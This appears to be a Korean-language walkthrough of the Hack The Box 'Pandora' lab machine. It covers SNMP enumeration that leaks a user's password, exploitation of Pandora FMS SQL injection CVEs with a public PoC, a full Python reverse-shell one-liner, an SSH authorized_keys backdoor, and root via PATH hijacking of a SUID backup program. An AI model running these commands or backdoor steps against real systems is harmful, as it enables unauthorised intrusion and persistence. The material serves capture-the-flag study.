# HTB-PANDORA
```bash
OS: Linux
DATE: 26.09.18
DIFFICULTY: Easy
```

## RECON
**nmap**: 초기 정찰을 위해 전체 포트 검사와 상세 포트 검사를 진행했다.
```bash
nmap -p- -T4 IP
nmap -sC -sV -p 22,80 IP
```
포트 검사 결과 80(HTTP) 서비스와 22(SSH) 서비스가 실행 중이었다. 따라서 웹에 접속했다. 초기 웹에서는 Play라는 사이트를 운영 중이었고, 딱히 기능을 찾아볼 수 없어서 웹 디렉토리와 서브도메인 brute force를 진행했다.
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u IP -H "Host: FUZZ.panda.htb" -fs 33560
```
```bash
ffuf -u IP -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -c -r
```
하지만 아무런 결과를 받지 못하여 nmap을 다시 한 번 더 돌려보았다. nmap은 기본적으로 TCP 포트만 검색하기 때문에 UDP 포트를 검사하는 옵션을 추가하여 정찰을 진행했다.
```bash
sudo nmap -sUV --top-ports 100 IP
```
```bash
sudo nmap -sUV -p- -T4 IP
```
따라서 161번 포트 SNMP 프로토콜이 실행 중이라는 것을 알 수 있었다.

## Initial Access
SNMP 프로토콜이 있다는 것을 알게 되어 snmpwalk로 타겟의 시스템 정보 등을 확인해보았다.
```bash
snmpwalk -c public -v2c IP
```
여러 유저명의 정보를 얻었지만 읽기 어려운 정보들이 나와 snmp-check를 다시 한 번 더 돌렸다.
```bash
snmp-check -p 161 IP
```
이곳에서 **daniel**이라는 유저의 크리덴셜을 얻을 수 있었다. 따라서 SSH에 바로 접속에 성공했다.
```txt
 1012                  runnable              mysqld                /usr/sbin/mysqld

  1040                  runnable              apache2               /usr/sbin/apache2     -k start

  1048                  runnable              apache2               /usr/sbin/apache2     -k start

  1115                  runnable              host_check            /usr/bin/host_check   -u daniel -p HotelBabylon23
  1215                  runnable              apache2               /usr/sbin/apache2     -k start

  1216                  runnable              apache2               /usr/sbin/apache2     -k start
```
![daniel](attach_real/Pasted%20image%2020260918134526.png)

Daniel 유저로는 matt라는 유저 디렉토리에 있는 유저 플래그를 읽지 못했다. 따라서 권한 상승을 위해 RECON 결과 /var/www/pandora 디렉토리를 확인해보니, play 웹 말고 다른 pandora_console이라는 웹이 실행 중이라는 것을 알게 되었다. 따라서 `http://IP/pandora_console`을 들어갔지만 404 상태가 나왔다. 따라서 쉘 안에서 `curl http://127.0.0.1/pandora_console/` 명령을 실행했을 때 200 상태 코드를 얻을 수 있었다. 따라서 SSH 로컬 포트포워딩을 통해 로컬에서 웹사이트에 접속했다.
```bash
ssh -L 8080:127.0.0.1:80 daniel@IP
```
웹사이트는 Pandora FMS v7.0NG.742라는 서비스가 돌아가고 있었다. 따라서 해당 서비스의 취약점을 검색해본 결과 **CVE-2020-5844** 취약점이 있었다. 해당 취약점은 로그인 가능한 상태에서 SQL 인젝션이 가능한 취약점이었다. 따라서 `/var/www/pandora/pandora_console/pandoradb_data.sql`에서 admin 패스워드 해시를 얻어 크랙에 성공해 로그인을 시도했지만, 알 수 없는 이유로 로그인이 불가능했다.
```sql
cat /var/www/pandora/pandora_console/pandoradb_data.sql

INSERT INTO `tusuario` (`id_user`, `fullname`, `firstname`, `lastname`, `middlename`, `password`, `comments`, `last_connect`, `registered`, `email`, `phone`, `is_admin`, `language`, `block_size`, `section`, `data_section`, `metaconsole_access`) VALUES
('admin', 'Pandora', 'Pandora', 'Admin', '', '1da7ee7d45b96d0e1f45ee4ee23da560', 'Admin Pandora', 1232642121, 0, 'admin@example.com', '555-555-5555', 1, 'default', 0, 'Default', '', 'advanced');
```
따라서 다른 취약점을 검색해본 결과 **CVE-2021-32099** unauthenticated SQLI 취약점이어서 PoC를 찾고 리버스 쉘을 얻을 수 있었다. 해당 취약점은 SQLI로 DB에서 세션 데이터를 조작해서 없던 admin 세션을 만들어버리는 취약점이다.
```bash
python pandoraFMS_sqlpwn.py -t 127.0.0.1:8000 -f shell.php
```
하지만 프로그램 자체에서 쉘을 만들어버리는 PoC였기 때문에 cd 같은 명령어가 작동하지 않았다. 따라서 리스닝 포트를 열고 nc를 통해 쉘을 다시 연결할 생각이었다. 하지만 bash 쉘, nc 쉘을 모두 실패했다. 따라서 python reverse 쉘을 실행한 결과 nc 쉘을 얻을 수 있었다.
```bash
nc -nlvp 4444
```
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("TUN_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```
이후 더 편한 접근을 위해 SSH 백도어를 심어 최종적으로 matt 쉘을 얻을 수 있었다.
```bash
(kali)
ssh-keygen -t rsa -f /tmp/pandora
```
```bash
(target)
mkdir -p ~/.ssh
chmod 700 ~/.ssh
```
```bash
(target)
echo "about /tmp/pandora.pub keys...." > ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```
```bash
ssh -i /tmp/pandora matt@IP
```
![matt](attach_real/Pasted%20image%2020260918150212.png)

## Privilege Escalation
쉘을 딴 후 SUID를 확인해본 결과 /usr/bin/pandora_backup이라는 프로그램이 root로 실행 가능하다는 것을 알게 되었다. 그리고 pspy를 통해 matt 쉘에서 tar를 호출하고 있다는 것을 알게 되었다.
```bash
UID=0  PID=23212  | /usr/bin/pandora_backup
UID=0  PID=23213  | sh -c tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*
```
따라서 PATH 하이재킹 취약점이 된다고 생각했다. pandora_backup 내부에서 tar를 호출할 때 절대 경로인 /usr/bin/tar가 아니라 그냥 tar로 호출하기 때문에, 리눅스가 명령어를 찾는 방식인 $PATH에서 제일 먼저 발견되는 tar를 실행하게 된다. 이걸 이용하는 게 PATH 하이재킹이다. 따라서 /tmp에 가짜 tar를 생성하여 exploit에 성공했다.
```bash
echo '/bin/bash' > /tmp/tar
chmod +x /tmp/tar
```
```bash
export PATH=/tmp:$PATH
```
```bash
echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
```bash
/usr/bin/pandora_backup
```
![root](attach_real/Pasted%20image%2020260918162222.png)

## New Inform
- 앞으로 nmap을 돌릴 때 UDP 포트 검사도 습관적으로 돌리자. `sudo nmap -sUV --top-ports 100 IP`, `sudo nmap -sUV -p- -T4 IP`
- TCP: 통신 전에 반드시 악수(핸드셰이크)를 먼저 한다. UDP: 비연결 기반. 악수 없이 그냥 던지고 끝.
- **SNMP**: 네트워크 장비나 서버를 모니터링·관리하기 위한 프로토콜. 원래 목적은 "이 서버 CPU 얼마야" 같은 걸 네트워크 관리자가 원격으로 체크하는 용도. UDP 161번 포트를 사용. SNMP는 세 요소로 돌아간다. 1. Manager -- 2. Agent -- 3. MIB(정보 저장소)
- SNMP 버전 (보안 핵심): v1: 커뮤니티 스트링 암호화 없음. 매우 취약. v2c: 커뮤니티 스트링 암호화 없음. 보안 취약. v3: 사용자/비번 인증, 암호화 있음. 그나마 안전.
- SNMP 커뮤니티 스트링: v1/v2c의 유일한 인증 수단. 그냥 평문 패스워드라고 보면 됨. public: 읽기 전용 관례 기본값. 정보 조회만 가능. private: 읽기/쓰기 관례 기본값. 값을 바꾸거나 설정 변경 가능.
- snmpwalk: SNMP 정보를 MIB 트리 전체를 순회하면서 긁어오는 툴. 커뮤니티 스트링과 버전을 지정해서 타겟의 시스템 정보, 프로세스 목록 등을 뽑아낸다.
- snmp-check: snmpwalk와 비슷한 역할을 하지만 사람이 읽기 좋게 정리해준다.
- 웹 서비스가 "내부에서만" 보이는 이유: 웹 서버를 실행할 때 어느 IP에서 오는 요청을 받을 것인지 지정한다. 이걸 바인딩이라고 한다. 0.0.0.0: 모든 곳에서 다 받음. pandora는 apache가 vhost를 두 개 운영하고 있었음. 기본 사이트 = 0.0.0.0, pandora console = 127.0.0.1. 따라서 netstat를 돌려서 0.0.0.0이 나와도 vhost로 나뉠 수 있음.
- 해당 취약점이 안 되면 다른 취약점을 빠르게 찾아본다.
- CMD 프롬프트의 한계: mkfifo, URL에서 특수문자가 깨짐. Python은 쉘 특수문자를 전혀 안 쓴다.
- 모든 리버스 쉘 유형 다 시도해볼 것.
- 항상 pspy를 돌려 모니터링 필수.